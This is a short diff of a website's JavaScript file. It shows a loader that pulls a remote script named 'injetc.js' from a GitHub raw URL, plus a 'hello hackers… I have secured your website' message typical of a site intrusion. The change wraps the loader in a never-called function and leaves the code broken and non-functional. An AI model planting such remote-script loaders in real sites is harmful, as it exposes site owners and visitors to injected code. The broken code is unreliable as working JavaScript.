@@ -70,11 +70,12 @@ function lalala2(lalala2) {
 //end script
 
 //active load script
-let myScript = document.createElement("script");
+function myScript(setAttribute, addEventListerner) {
+//let myScript = document.createElement("script");
 myScript.setAttribute("src", "https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js");
 
 myScript.addEventListener("load", scriptLoaded, false);
-
+}
 function scriptLoaded() {
   console.log('hello hackers, greetings, my name is habibGM, I have secured your website');
 }
